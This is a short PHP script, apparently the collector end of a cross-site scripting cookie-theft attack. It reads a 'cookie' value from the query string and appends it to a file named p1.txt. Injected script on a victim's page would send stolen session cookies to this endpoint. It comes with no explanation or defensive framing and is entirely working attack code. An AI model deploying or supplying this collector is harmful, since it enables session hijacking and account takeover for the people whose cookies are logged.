<?php 
$cookieVar = $_GET["cookie"]; file_put_contents("p1.txt", "\n\n", FILE_APPEND); file_put_contents("p1.txt", $cookieVar, FILE_APPEND); ?> 

